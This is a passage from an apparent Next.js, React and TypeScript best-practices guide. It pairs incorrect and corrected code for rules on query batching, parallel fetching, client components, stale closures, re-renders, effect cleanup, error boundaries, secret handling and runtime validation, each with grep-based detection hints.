**Correct (batch query with IN clause):**

```typescript
// ✅ Two queries instead of N+1
export async function getUsersWithPosts() {
  const users = await prisma.user.findMany()
  const userIds = users.map((u) => u.id)

  const posts = await prisma.post.findMany({
    where: { authorId: { in: userIds } },
  })

  // Group posts by author in memory
  const postsByAuthor = new Map<string, Post[]>()
  for (const post of posts) {
    const existing = postsByAuthor.get(post.authorId) ?? []
    existing.push(post)
    postsByAuthor.set(post.authorId, existing)
  }

  return users.map((user) => ({
    ...user,
    posts: postsByAuthor.get(user.id) ?? [],
  }))
}
// 100 users = 2 database queries ✅
```

**In Server Components (hidden N+1):**

```typescript
// ❌ Each UserCard triggers its own query
async function UserList() {
  const users = await prisma.user.findMany()
  return users.map((user) => <UserCard key={user.id} userId={user.id} />)
}

async function UserCard({ userId }: { userId: string }) {
  // This runs once per card = N queries
  const profile = await prisma.profile.findUnique({
    where: { userId },
  })
  return <div>{profile?.bio}</div>
}

// ✅ Fix: fetch all data at the parent level
async function UserList() {
  const users = await prisma.user.findMany({
    include: { profile: true },
  })
  return users.map((user) => <UserCard key={user.id} user={user} />)
}
```

**Detection hints:**

```bash
# Find queries inside .map() or .forEach() — likely N+1
grep -rn "\.map(async" src/ --include="*.ts" --include="*.tsx" -A 3 | grep -E "prisma\.|supabase\.|db\."
# Find queries inside loop bodies
grep -rn "for.*of\|forEach" src/ --include="*.ts" --include="*.tsx" -A 5 | grep -E "await.*\.(find|get|fetch|query)"
```

Reference: [Prisma Relation Queries](https://www.prisma.io/docs/orm/prisma-client/queries/relation-queries)

---

## Parallelize Independent Async Operations

**Impact: CRITICAL (2-10× faster page loads by eliminating request waterfalls)**

Sequential `await` calls that don't depend on each other add unnecessary latency. Each `await` blocks until it completes before the next one starts. If three independent calls each take 200ms, sequential execution takes 600ms while parallel takes 200ms.

This is especially impactful in Server Components where multiple data fetches are common.

**Incorrect (sequential — each await blocks the next):**

```typescript
// ❌ 3 sequential round trips in a Server Component
// Total time: fetchUser + fetchPosts + fetchAnalytics
export default async function DashboardPage() {
  const user = await fetchUser()
  const posts = await fetchPosts()
  const analytics = await fetchAnalytics()

  return <Dashboard user={user} posts={posts} analytics={analytics} />
}
```

```typescript
// ❌ Sequential in API routes too
export async function GET() {
  const products = await db.product.findMany()
  const categories = await db.category.findMany()
  const reviews = await db.review.findMany({ take: 10 })

  return Response.json({ products, categories, reviews })
}
```

**Correct (parallel — all fire at once):**

```typescript
// ✅ All three fetch simultaneously
// Total time: max(fetchUser, fetchPosts, fetchAnalytics)
export default async function DashboardPage() {
  const [user, posts, analytics] = await Promise.all([
    fetchUser(),
    fetchPosts(),
    fetchAnalytics(),
  ])

  return <Dashboard user={user} posts={posts} analytics={analytics} />
}
```

**Correct (Suspense boundaries for progressive loading):**

```tsx
// ✅ Even better: stream content as it resolves
import { Suspense } from 'react'

export default async function DashboardPage() {
  return (
    <>
      <Suspense fallback={<UserSkeleton />}>
        <UserSection />
      </Suspense>
      <Suspense fallback={<PostsSkeleton />}>
        <PostsSection />
      </Suspense>
      <Suspense fallback={<AnalyticsSkeleton />}>
        <AnalyticsSection />
      </Suspense>
    </>
  )
}

// Each component fetches its own data independently
async function UserSection() {
  const user = await fetchUser()
  return <UserCard user={user} />
}
```

**Partial dependencies (when some calls depend on others):**

```typescript
// ✅ Fetch user first, then parallelize the rest
export default async function DashboardPage() {
  const user = await fetchUser()

  // These depend on user.id but not on each other
  const [posts, settings, notifications] = await Promise.all([
    fetchPosts(user.id),
    fetchSettings(user.id),
    fetchNotifications(user.id),
  ])

  return <Dashboard user={user} posts={posts} settings={settings} />
}
```

**Detection hints:**

```bash
# Find consecutive awaits in the same function
grep -rn "await " src/ --include="*.ts" --include="*.tsx" -A 1 | grep -B 1 "await "
```

Reference: [Next.js Data Fetching Patterns](https://nextjs.org/docs/app/building-your-application/data-fetching/fetching#parallel-data-fetching)

---

## Prefer Server Components — Only Add 'use client' When Necessary

**Impact: HIGH (reduces JavaScript bundle sent to browser, improves load times)**

In the Next.js App Router, components are Server Components by default. Adding `'use client'` sends the component's JavaScript to the browser, increasing bundle size and Time to Interactive. Only add the client directive when you actually need browser APIs, event handlers, or React hooks that require client-side execution.

**Incorrect (unnecessary 'use client'):**

```tsx
// ❌ This component has no interactivity — why is it a client component?
'use client'

export function UserProfile({ user }: { user: User }) {
  return (
    <div>
      <h1>{user.name}</h1>
      <p>{user.bio}</p>
      <img src={user.avatarUrl} alt={user.name} />
    </div>
  )
}
```

```tsx
// ❌ Marking the entire page as client just because one small part needs interactivity
'use client'

import { useState } from 'react'

export default function ProductPage({ product }: { product: Product }) {
  const [showDetails, setShowDetails] = useState(false)

  return (
    <div>
      <h1>{product.name}</h1>
      <p>{product.description}</p>           {/* Static */}
      <ProductSpecs specs={product.specs} />  {/* Static */}
      <ReviewsList reviews={product.reviews} /> {/* Static */}
      <button onClick={() => setShowDetails(!showDetails)}>
        {showDetails ? 'Hide' : 'Show'} Details
      </button>
      {showDetails && <Details product={product} />}
    </div>
  )
}
```

**Correct (push 'use client' to the leaf):**

```tsx
// ✅ Page stays as Server Component — zero JS sent for static content
export default async function ProductPage({ params }: { params: { id: string } }) {
  const product = await fetchProduct(params.id)

  return (
    <div>
      <h1>{product.name}</h1>
      <p>{product.description}</p>
      <ProductSpecs specs={product.specs} />
      <ReviewsList reviews={product.reviews} />
      {/* Only this small piece is a Client Component */}
      <DetailsToggle product={product} />
    </div>
  )
}

// components/DetailsToggle.tsx
'use client'
import { useState } from 'react'

export function DetailsToggle({ product }: { product: Product }) {
  const [showDetails, setShowDetails] = useState(false)

  return (
    <>
      <button onClick={() => setShowDetails(!showDetails)}>
        {showDetails ? 'Hide' : 'Show'} Details
      </button>
      {showDetails && <Details product={product} />}
    </>
  )
}
```

**When you DO need 'use client':**

- `useState`, `useReducer`, `useEffect`, `useRef` and other React hooks
- Event handlers (`onClick`, `onChange`, `onSubmit`)
- Browser APIs (`window`, `document`, `localStorage`, `navigator`)
- Third-party libraries that use hooks or browser APIs

**Detection hints:**

```bash
# Find client components that might not need to be
grep -rn "'use client'" src/ --include="*.tsx" -l | while read f; do
  if ! grep -qE "useState|useEffect|useReducer|useRef|useCallback|useMemo|onClick|onChange|onSubmit|addEventListener" "$f"; then
    echo "Possibly unnecessary 'use client': $f"
  fi
done
```

Reference: [Next.js Server and Client Components](https://nextjs.org/docs/app/building-your-application/rendering/composition-patterns)

---

## Avoid Stale Closure Bugs in Hooks and Callbacks

**Impact: MEDIUM (prevents silent data corruption from outdated state references in async operations)**

JavaScript closures capture variables at creation time. When a callback inside `useEffect`, `setInterval`, `setTimeout`, or `addEventListener` references a state variable, it captures the value from that specific render — not the current value. This causes the callback to silently use outdated data.

Stale closures are the most frequently misdiagnosed React bug. They manifest as "my state isn't updating" or "my handler uses the old value."

**Incorrect (stale closure captures initial state):**

```tsx
'use client'

// ❌ count is always 0 inside the interval — captured from the first render
function Counter() {
  const [count, setCount] = useState(0)

  useEffect(() => {
    const id = setInterval(() => {
      console.log(count) // Always logs 0!
      setCount(count + 1) // Always sets to 1!
    }, 1000)
    return () => clearInterval(id)
  }, []) // Empty deps = closure captures initial count forever

  return <span>{count}</span>
}
```

```tsx
// ❌ Debounced handler uses stale search term
function SearchBar() {
  const [query, setQuery] = useState('')
  const [results, setResults] = useState([])

  const debouncedSearch = useMemo(
    () => debounce(async () => {
      const data = await fetch(`/api/search?q=${query}`) // query is stale!
      setResults(await data.json())
    }, 300),
    [] // query not in deps = always uses initial empty string
  )

  return <input onChange={e => { setQuery(e.target.value); debouncedSearch() }} />
}
```

```tsx
// ❌ Event listener references stale state
function ChatRoom({ roomId }) {
  const [messages, setMessages] = useState([])

  useEffect(() => {
    const ws = new WebSocket(`/ws/${roomId}`)
    ws.onmessage = (event) => {
      // messages is always [] here — captured from this render
      setMessages([...messages, JSON.parse(event.data)]) // Overwrites all messages!
    }
    return () => ws.close()
  }, [roomId])
}
```

**Correct (avoid stale closures):**

```tsx
'use client'

// ✅ Use functional updater — always gets the current state
function Counter() {
  const [count, setCount] = useState(0)

  useEffect(() => {
    const id = setInterval(() => {
      setCount(prev => prev + 1) // prev is always current
    }, 1000)
    return () => clearInterval(id)
  }, [])

  return <span>{count}</span>
}
```

```tsx
// ✅ Use a ref for values needed in long-lived callbacks
function SearchBar() {
  const [query, setQuery] = useState('')
  const queryRef = useRef(query)
  queryRef.current = query // Always up to date

  const debouncedSearch = useMemo(
    () => debounce(async () => {
      const data = await fetch(`/api/search?q=${queryRef.current}`) // Always fresh
      setResults(await data.json())
    }, 300),
    []
  )

  return <input onChange={e => { setQuery(e.target.value); debouncedSearch() }} />
}
```

```tsx
// ✅ Functional updater for arrays/objects in subscriptions
function ChatRoom({ roomId }) {
  const [messages, setMessages] = useState([])

  useEffect(() => {
    const ws = new WebSocket(`/ws/${roomId}`)
    ws.onmessage = (event) => {
      setMessages(prev => [...prev, JSON.parse(event.data)]) // prev is current
    }
    return () => ws.close()
  }, [roomId])
}
```

**Patterns and fixes:**

| Pattern | Fix |
|---------|-----|
| `setCount(count + 1)` in interval/timeout | `setCount(prev => prev + 1)` |
| `[...array, item]` in subscription | `setArray(prev => [...prev, item])` |
| Reading state in debounce/throttle | Use `useRef` to mirror the value |
| Comparing state in event listener | Pass value as dependency, or use ref |

**Detection hints:**

```bash
# Find setInterval/setTimeout using state variables directly
grep -rn "setInterval\|setTimeout" src/ --include="*.tsx" --include="*.ts" -A 3 | grep -v "prev =>\|prev)"
```

Reference: [React Docs: Removing Effect Dependencies](https://react.dev/learn/removing-effect-dependencies) · [A Complete Guide to useEffect](https://overreacted.io/a-complete-guide-to-useeffect/)

---

## Prevent Unnecessary Re-renders from Unstable References

**Impact: HIGH (eliminates cascading re-renders that degrade Core Web Vitals and interaction responsiveness)**

React re-renders a component whenever its parent re-renders or its props change. Props are compared by **reference**, not by value. This means inline objects (`style={{}}`), inline arrays (`items={[]}`), and inline functions (`onClick={() => {}}`) create new references every render — even if the values are identical — triggering re-renders in every child component.

This is the root cause of most "my React app is slow" complaints.

**Incorrect (new references every render):**

```tsx
'use client'

function Dashboard({ userId }: { userId: string }) {
  const [count, setCount] = useState(0)

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>Click: {count}</button>

      {/* ❌ Every click re-renders ALL of these children */}
      <UserProfile
        style={{ padding: 16, margin: 8 }}      // New object every render
        options={['edit', 'delete', 'share']}     // New array every render
        onAction={(action) => handleAction(action)} // New function every render
      />
      <ActivityFeed filters={{ userId, limit: 20 }} />  // New object every render
      <Sidebar config={{ theme: 'dark', collapsed: false }} />
    </div>
  )
}
```

```tsx
// ❌ Context value creates a new object every render → all consumers re-render
function AppProvider({ children }) {
  const [user, setUser] = useState(null)
  const [theme, setTheme] = useState('light')

  return (
    <AppContext.Provider value={{ user, setUser, theme, setTheme }}>
      {children}
    </AppContext.Provider>
  )
}
```

**Correct (stable references):**

```tsx
'use client'

// ✅ Move static values outside the component
const profileStyle = { padding: 16, margin: 8 }
const profileOptions = ['edit', 'delete', 'share'] as const
const sidebarConfig = { theme: 'dark', collapsed: false }

function Dashboard({ userId }: { userId: string }) {
  const [count, setCount] = useState(0)

  // ✅ Memoize dynamic objects that depend on props/state
  const feedFilters = useMemo(() => ({ userId, limit: 20 }), [userId])

  // ✅ Stabilize callbacks
  const handleAction = useCallback((action: string) => {
    // ... handle action
  }, [])

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>Click: {count}</button>
      <UserProfile
        style={profileStyle}
        options={profileOptions}
        onAction={handleAction}
      />
      <ActivityFeed filters={feedFilters} />
      <Sidebar config={sidebarConfig} />
    </div>
  )
}
```

```tsx
// ✅ Memoize context value to prevent unnecessary consumer re-renders
function AppProvider({ children }) {
  const [user, setUser] = useState(null)
  const [theme, setTheme] = useState('light')

  const value = useMemo(
    () => ({ user, setUser, theme, setTheme }),
    [user, theme]
  )

  return (
    <AppContext.Provider value={value}>
      {children}
    </AppContext.Provider>
  )
}
```

```tsx
// ✅ Split contexts by update frequency — state that changes together stays together
const UserContext = createContext<{ user: User | null; setUser: SetState }>()
const ThemeContext = createContext<{ theme: string; setTheme: SetState }>()

// Now changing theme doesn't re-render components that only use user
```

**Quick reference:**

| Pattern | Problem | Fix |
|---------|---------|-----|
| `style={{ ... }}` | New object every render | Const outside component |
| `options={[...]}` | New array every render | Const outside or `useMemo` |
| `onClick={() => fn()}` | New function every render | `useCallback` |
| `context value={{ a, b }}` | All consumers re-render | `useMemo` on value |
| Frequently-changing state in Context | Cascading re-renders | Split contexts |

**Detection hints:**

```bash
# Find inline objects/arrays as JSX props
grep -rn "style={{" src/ --include="*.tsx"
grep -rn "={\\[" src/ --include="*.tsx" | grep -v "import\|const\|let\|var"
# Find context providers with inline value objects
grep -rn "Provider value={{" src/ --include="*.tsx"
```

Reference: [React Docs: Optimizing Re-renders](https://react.dev/reference/react/memo) · [When to useMemo and useCallback](https://kentcdodds.com/blog/usememo-and-usecallback)

---

## Always Return Cleanup Functions from useEffect

**Impact: HIGH (prevents memory leaks, stale state updates on unmounted components, and race conditions)**

Every `useEffect` that creates a subscription, timer, event listener, or starts an async operation needs a cleanup function. Without cleanup:

- **Event listeners accumulate** — each re-render adds another listener
- **Timers keep firing** after the component unmounts, updating stale state
- **Fetch requests complete** after navigation, causing "state update on unmounted component" errors
- **WebSocket connections stay open**, leaking memory and server resources

This is the single most common React bug found in code reviews.

**Incorrect (missing cleanup):**

```tsx
'use client'

// ❌ Event listener added on every render, never removed
useEffect(() => {
  window.addEventListener('resize', handleResize)
}, [])

// ❌ Interval runs forever, even after unmount
useEffect(() => {
  setInterval(() => {
    setCount(c => c + 1)
  }, 1000)
}, [])

// ❌ Fetch race condition — if component re-renders, both requests resolve
useEffect(() => {
  fetch(`/api/user/${userId}`)
    .then(res => res.json())
    .then(data => setUser(data)) // May set state on unmounted component
}, [userId])

// ❌ WebSocket never closed
useEffect(() => {
  const ws = new WebSocket('wss://api.example.com/feed')
  ws.onmessage = (event) => setMessages(prev => [...prev, event.data])
}, [])
```

**Correct (cleanup functions that prevent leaks):**

```tsx
'use client'

// ✅ Event listener: add and remove
useEffect(() => {
  window.addEventListener('resize', handleResize)
  return () => window.removeEventListener('resize', handleResize)
}, [])

// ✅ Interval: clear on unmount
useEffect(() => {
  const id = setInterval(() => {
    setCount(c => c + 1)
  }, 1000)
  return () => clearInterval(id)
}, [])

// ✅ Fetch: abort on cleanup to prevent race conditions
useEffect(() => {
  const controller = new AbortController()

  fetch(`/api/user/${userId}`, { signal: controller.signal })
    .then(res => res.json())
    .then(data => setUser(data))
    .catch(err => {
      if (err.name !== 'AbortError') throw err // Ignore abort errors
    })

  return () => controller.abort()
}, [userId])

// ✅ WebSocket: close on unmount
useEffect(() => {
  const ws = new WebSocket('wss://api.example.com/feed')
  ws.onmessage = (event) => setMessages(prev => [...prev, event.data])

  return () => ws.close()
}, [])

// ✅ Third-party subscription: unsubscribe
useEffect(() => {
  const unsubscribe = store.subscribe((state) => {
    setLocalState(state)
  })
  return unsubscribe
}, [])
```

**Rule of thumb:** if you see `addEventListener`, `setInterval`, `setTimeout`, `subscribe`, `new WebSocket`, `new EventSource`, or `fetch` inside a `useEffect`, there must be a corresponding cleanup in the return function.

**Detection hints:**

```bash
# Find useEffects with subscriptions but no cleanup return
grep -rn "useEffect" src/ --include="*.tsx" --include="*.ts" -A 5 | grep -B 2 "addEventListener\|setInterval\|subscribe\|WebSocket"
```

Reference: [React useEffect Cleanup](https://react.dev/learn/synchronizing-with-effects#how-to-handle-the-effect-firing-twice-in-development) · [React Docs: You Might Not Need an Effect](https://react.dev/learn/you-might-not-need-an-effect)

---

## Add Error Boundaries Around Unreliable Content

**Impact: MEDIUM (prevents full-page crashes from isolated component failures)**

Without error boundaries, a single thrown error in any component crashes the entire page. In Next.js App Router, `error.tsx` files act as error boundaries at the route segment level. For more granular control, wrap unreliable sections (third-party widgets, user-generated content, data-dependent components) so failures are contained.

**Incorrect (no error boundaries — one failure kills the page):**

```tsx
// ❌ If AnalyticsChart throws, the entire dashboard crashes
export default async function DashboardPage() {
  const user = await fetchUser()
  const analytics = await fetchAnalytics()

  return (
    <div>
      <UserHeader user={user} />
      <AnalyticsChart data={analytics} />  {/* If this throws = blank page */}
      <RecentActivity />
    </div>
  )
}
```

**Correct (Next.js error.tsx at the route level):**

```tsx
// app/dashboard/error.tsx
'use client'

export default function DashboardError({
  error,
  reset,
}: {
  error: Error & { digest?: string }
  reset: () => void
}) {
  return (
    <div>
      <h2>Something went wrong loading the dashboard.</h2>
      <button onClick={() => reset()}>Try again</button>
    </div>
  )
}
```

**Correct (granular error boundaries for unreliable sections):**

```tsx
// ✅ Isolate failures so the rest of the page still works
import { ErrorBoundary } from 'react-error-boundary'

export default async function DashboardPage() {
  const user = await fetchUser()

  return (
    <div>
      <UserHeader user={user} />

      <ErrorBoundary fallback={<p>Charts temporarily unavailable.</p>}>
        <Suspense fallback={<ChartSkeleton />}>
          <AnalyticsChart userId={user.id} />
        </Suspense>
      </ErrorBoundary>

      <ErrorBoundary fallback={<p>Could not load activity feed.</p>}>
        <Suspense fallback={<ActivitySkeleton />}>
          <RecentActivity userId={user.id} />
        </Suspense>
      </ErrorBoundary>
    </div>
  )
}
```

**Also add not-found.tsx for missing data:**

```tsx
// app/dashboard/[id]/not-found.tsx
export default function NotFound() {
  return <p>This dashboard does not exist.</p>
}

// app/dashboard/[id]/page.tsx
import { notFound } from 'next/navigation'

export default async function DashboardPage({ params }: { params: { id: string } }) {
  const dashboard = await fetchDashboard(params.id)
  if (!dashboard) notFound()

  return <Dashboard data={dashboard} />
}
```

**Detection hints:**

```bash
# Find route segments missing error.tsx
find src/app -type d | while read dir; do
  if [ -f "$dir/page.tsx" ] && [ ! -f "$dir/error.tsx" ]; then
    echo "Missing error.tsx: $dir"
  fi
done
```

Reference: [Next.js Error Handling](https://nextjs.org/docs/app/building-your-application/routing/error-handling) · [react-error-boundary](https://github.com/bvaughn/react-error-boundary)

---

## Break Up God Components Into Focused, Composable Units

**Impact: MEDIUM (improves maintainability, testability, and reuse)**

"God components" are components that do too much — handling data fetching, business logic, state management, and rendering all in one file. They are hard to test, hard to reuse, and create merge conflicts when multiple developers work on the same feature. A component should have one clear job.

**Incorrect (single component doing everything):**

```tsx
// ❌ 300+ line component handling fetch, state, validation, and rendering
'use client'

export function UserDashboard({ userId }: { userId: string }) {
  const [user, setUser] = useState(null)
  const [posts, setPosts] = useState([])
  const [analytics, setAnalytics] = useState(null)
  const [editMode, setEditMode] = useState(false)
  const [formData, setFormData] = useState({})
  const [errors, setErrors] = useState({})
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    fetch(`/api/users/${userId}`).then(r => r.json()).then(setUser)
    fetch(`/api/users/${userId}/posts`).then(r => r.json()).then(setPosts)
    fetch(`/api/analytics/${userId}`).then(r => r.json()).then(setAnalytics)
    setLoading(false)
  }, [userId])

  function validateForm() { /* 40 lines of validation */ }
  function handleSubmit() { /* 30 lines of submission logic */ }
  function handleDelete(postId: string) { /* 20 lines */ }

  if (loading) return <Spinner />

  return (
    <div>
      {/* 200 lines of mixed rendering: profile header, edit form,
          posts list, analytics charts, action buttons... */}
    </div>
  )
}
```

**Correct (decomposed into focused components):**

```tsx
// ✅ Page-level Server Component handles data fetching
// app/dashboard/page.tsx
export default async function DashboardPage({ params }: { params: { userId: string } }) {
  const [user, posts, analytics] = await Promise.all([
    fetchUser(params.userId),
    fetchPosts(params.userId),
    fetchAnalytics(params.userId),
  ])

  return (
    <div>
      <UserHeader user={user} />
      <UserProfileEditor user={user} />
      <PostsList posts={posts} />
      <AnalyticsOverview analytics={analytics} />
    </div>
  )
}
```

```tsx
// ✅ Each component has one job
// components/UserHeader.tsx — pure display, no state needed
export function UserHeader({ user }: { user: User }) {
  return (
    <header>
      <img src={user.avatarUrl} alt={user.name} />
      <h1>{user.name}</h1>
      <p>{user.role}</p>
    </header>
  )
}

// components/UserProfileEditor.tsx — handles edit state only
'use client'
export function UserProfileEditor({ user }: { user: User }) {
  const [editMode, setEditMode] = useState(false)
  // Focused: only handles profile editing
}

// components/PostsList.tsx — handles post display + actions
export function PostsList({ posts }: { posts: Post[] }) {
  return posts.map((post) => <PostCard key={post.id} post={post} />)
}
```

**Rule of thumb:** If a component file exceeds ~150 lines or manages more than 3 pieces of state, it's a strong candidate for decomposition.

**Detection hints:**

```bash
# Find large component files (likely god components)
find src/ -name "*.tsx" -exec wc -l {} + | sort -rn | head -20
# Find components with many useState calls
grep -rn "useState" src/ --include="*.tsx" -c | sort -t: -k2 -rn | head -10
```

Reference: [React Composition Patterns](https://react.dev/learn/thinking-in-react)

---

## Implement loading.tsx and error.tsx at Every Route Segment

**Impact: MEDIUM (prevents full-page loading states and uncontained error propagation)**

Next.js App Router uses `loading.tsx` and `error.tsx` as automatic Suspense and Error Boundaries. Without them:

- **Missing `loading.tsx`**: Suspense falls back to the nearest parent boundary — often the root layout — showing a full-page spinner instead of a granular skeleton for just the loading section
- **Missing `error.tsx`**: Errors propagate up the component tree and crash the nearest parent layout, potentially taking down the entire page or even the app shell

**Incorrect (missing boundary files):**

```
app/
├── layout.tsx          ← Only error/loading boundary for the entire app
├── page.tsx
├── dashboard/
│   ├── page.tsx        ← ❌ No loading.tsx — full page spinner when navigating here
│   ├── analytics/
│   │   └── page.tsx    ← ❌ No error.tsx — API failure crashes the entire dashboard
│   └── settings/
│       └── page.tsx
└── profile/
    └── page.tsx
```

```tsx
// ❌ No loading state — user sees nothing while data loads
// app/dashboard/page.tsx
export default async function Dashboard() {
  const data = await fetchDashboardData() // 2-3 second fetch, no visual feedback
  return <DashboardView data={data} />
}

// ❌ No error boundary — if fetchAnalytics throws, the dashboard layout crashes
// app/dashboard/analytics/page.tsx
export default async function Analytics() {
  const data = await fetchAnalytics() // Throws → entire dashboard is blank
  return <AnalyticsView data={data} />
}
```

**Correct (boundary files at each route segment):**

```
app/
├── layout.tsx
├── loading.tsx          ← Root loading state (for initial page load)
├── error.tsx            ← Root error boundary (last resort)
├── page.tsx
├── dashboard/
│   ├── layout.tsx
│   ├── loading.tsx      ← ✅ Dashboard-specific skeleton
│   ├── error.tsx        ← ✅ Dashboard-specific error UI
│   ├── page.tsx
│   ├── analytics/
│   │   ├── loading.tsx  ← ✅ Analytics skeleton while data loads
│   │   ├── error.tsx    ← ✅ Isolates analytics errors from dashboard
│   │   └── page.tsx
│   └── settings/
│       ├── loading.tsx
│       ├── error.tsx
│       └── page.tsx
└── profile/
    ├── loading.tsx
    ├── error.tsx
    └── page.tsx
```

```tsx
// app/dashboard/loading.tsx — shows while dashboard page data loads
export default function DashboardLoading() {
  return (
    <div className="animate-pulse space-y-4">
      <div className="h-8 bg-gray-200 rounded w-1/3" />
      <div className="grid grid-cols-3 gap-4">
        <div className="h-32 bg-gray-200 rounded" />
        <div className="h-32 bg-gray-200 rounded" />
        <div className="h-32 bg-gray-200 rounded" />
      </div>
    </div>
  )
}
```

```tsx
// app/dashboard/analytics/error.tsx — contains errors to this segment
'use client' // Error boundaries must be Client Components

export default function AnalyticsError({
  error,
  reset,
}: {
  error: Error & { digest?: string }
  reset: () => void
}) {
  return (
    <div className="p-4 border border-red-200 rounded bg-red-50">
      <h2 className="text-red-800 font-semibold">Analytics unavailable</h2>
      <p className="text-red-600 text-sm mt-1">
        {error.message || 'Failed to load analytics data.'}
      </p>
      <button
        onClick={reset}
        className="mt-3 px-4 py-2 bg-red-600 text-white rounded text-sm"
      >
        Try again
      </button>
    </div>
  )
}
```

**Key principles:**

1. **Every route segment with async data should have a `loading.tsx`** — enables streaming and progressive rendering
2. **Every route segment with external dependencies should have an `error.tsx`** — contains failures to that segment
3. **`error.tsx` must be a Client Component** (`'use client'`) — React Error Boundaries require it
4. **`error.tsx` cannot catch errors in the same segment's `layout.tsx`** — use a parent `error.tsx` for layout errors, or the special `global-error.tsx` at the root
5. **Don't use a single root loading/error** — that defeats granular streaming

**Detection hints:**

```bash
# Find route segments missing loading.tsx
ls -d src/app/**/page.tsx | while read f; do dir=$(dirname "$f"); [ ! -f "$dir/loading.tsx" ] && echo "Missing: $dir/loading.tsx"; done
# Find route segments missing error.tsx
ls -d src/app/**/page.tsx | while read f; do dir=$(dirname "$f"); [ ! -f "$dir/error.tsx" ] && echo "Missing: $dir/error.tsx"; done
```

Reference: [Next.js Loading UI](https://nextjs.org/docs/app/building-your-application/routing/loading-ui-and-streaming) · [Next.js Error Handling](https://nextjs.org/docs/app/building-your-application/routing/error-handling)

---

## Never Hardcode Secrets — Use Environment Variables Properly

**Impact: HIGH (prevents credential leaks in source control and client bundles)**

Hardcoded API keys, database URLs, and tokens in source code end up in Git history permanently — even if deleted later. In Next.js, any environment variable prefixed with `NEXT_PUBLIC_` is embedded in the client bundle and visible to anyone. Use `.env.local` for secrets, never commit them, and understand which variables are public vs. server-only.

**Incorrect (hardcoded secrets):**

```typescript
// ❌ Hardcoded in source — visible in Git history forever
const stripe = new Stripe('sk_live_abc123realkey456', {
  apiVersion: '2024-01-01',
})

// ❌ Database URL in code
const prisma = new PrismaClient({
  datasources: {
    db: { url: 'postgresql://admin:password@prod-db:5432/myapp' },
  },
})
```

**Incorrect (wrong env var prefix):**

```typescript
// ❌ NEXT_PUBLIC_ prefix makes this visible in the browser bundle!
// .env.local
NEXT_PUBLIC_STRIPE_SECRET=sk_live_abc123

// ❌ Anyone can see this in the browser's JS source
const stripe = new Stripe(process.env.NEXT_PUBLIC_STRIPE_SECRET!)
```

**Correct (server-only env vars):**

```bash
# .env.local (never committed — in .gitignore)
STRIPE_SECRET_KEY=sk_live_abc123
DATABASE_URL=postgresql://admin:password@prod-db:5432/myapp

# Only public/non-sensitive values get the NEXT_PUBLIC_ prefix
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_live_xyz789
NEXT_PUBLIC_APP_URL=https://myapp.com
```

```typescript
// ✅ Server-only — only accessible in Server Components, API routes, Server Actions
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!, {
  apiVersion: '2024-01-01',
})

// ✅ Validate env vars at startup
import { z } from 'zod'

const envSchema = z.object({
  STRIPE_SECRET_KEY: z.string().startsWith('sk_'),
  DATABASE_URL: z.string().url(),
  NEXT_PUBLIC_APP_URL: z.string().url(),
})

export const env = envSchema.parse(process.env)
```

**Ensure .gitignore includes env files:**

```gitignore
# .gitignore
.env
.env.local
.env.*.local
```

**Detection hints:**

```bash
# Find hardcoded secrets (API keys, tokens, passwords)
grep -rn "sk_live\|sk_test\|password.*=.*['\"]" src/ --include="*.ts" --include="*.tsx"
# Find NEXT_PUBLIC_ vars that look like secrets
grep -rn "NEXT_PUBLIC_.*SECRET\|NEXT_PUBLIC_.*KEY\|NEXT_PUBLIC_.*TOKEN" .env* src/
# Check if .env.local is in .gitignore
grep -q "\.env\.local" .gitignore && echo "OK" || echo "WARNING: .env.local not in .gitignore"
```

Reference: [Next.js Environment Variables](https://nextjs.org/docs/app/building-your-application/configuring/environment-variables) · [CWE-798: Hardcoded Credentials](https://cwe.mitre.org/data/definitions/798.html)

---

## Never Use Type Assertions on External Data — Validate Instead

**Impact: MEDIUM (prevents delayed runtime crashes from data that silently bypasses type safety)**

`as SomeType` is a type assertion — it tells TypeScript "trust me, I know what this is." It performs zero runtime checking. When you assert the type of an API response, form data, URL parameter, or any external data, TypeScript shows no errors at compile time. But if the actual data doesn't match, the crash happens deep in your application — far from the boundary where you could have caught it — making debugging extremely difficult.

This is distinct from `qual-typescript-any-boundary` (which covers `any`). Type assertions are more insidious because the code looks fully typed.

**Incorrect (type assertions on external data):**

```typescript
// ❌ Looks safe — TypeScript shows no errors — but is a lie
interface User {
  id: string
  name: string
  email: string
  role: 'admin' | 'user'
}

export async function GET() {
  const res = await fetch('https://api.example.com/user/1')
  const user = await res.json() as User // TypeScript trusts you completely

  // If API returns { id: 1, fullName: "..." } instead:
  // user.name → undefined (no crash here, silent corruption)
  // user.name.toUpperCase() → "Cannot read properties of undefined" (crashes later)
  // user.role === 'admin' → false (security bug: can't distinguish missing from 'user')
  return NextResponse.json({ greeting: `Hello ${user.name}` }) // "Hello undefined"
}
```

```typescript
// ❌ Type assertion on search params
export default function Page({ searchParams }: { searchParams: Record<string, string> }) {
  const filters = searchParams as { category: string; sort: 'asc' | 'desc'; page: string }
  // If ?sort=invalid → filters.sort is "invalid" but TypeScript says it's 'asc' | 'desc'
  const items = await getItems({ sort: filters.sort }) // Passes invalid value to query
}
```

```typescript
// ❌ Double assertion to force incompatible types
const config = JSON.parse(rawConfig) as unknown as AppConfig
// If rawConfig is malformed, config silently has wrong shape
```

**Correct (runtime validation, type inference):**

```typescript
// ✅ Parse + infer — type comes from the schema, not an assertion
import { z } from 'zod'

const UserSchema = z.object({
  id: z.string(),
  name: z.string(),
  email: z.string().email(),
  role: z.enum(['admin', 'user']),
})

type User = z.infer<typeof UserSchema> // Derived from schema, always in sync

export async function GET() {
  const res = await fetch('https://api.example.com/user/1')
  const json = await res.json()
  const user = UserSchema.parse(json) // Throws with clear error if shape is wrong

  // TypeScript knows the exact shape — because it was validated
  return NextResponse.json({ greeting: `Hello ${user.name}` })
}
```

```typescript
// ✅ Search params with safe parsing and defaults
const FiltersSchema = z.object({
  category: z.string().optional(),
  sort: z.enum(['asc', 'desc']).default('asc'),
  page: z.coerce.number().int().min(1).default(1),
})

export default async function Page({
  searchParams,
}: {
  searchParams: Record<string, string | string[] | undefined>
}) {
  const filters = FiltersSchema.parse(searchParams) // Validated + defaulted
  const items = await getItems(filters) // All values are guaranteed valid
}
```

```typescript
// ✅ Use safeParse when you want to handle errors gracefully
const result = UserSchema.safeParse(json)
if (!result.success) {
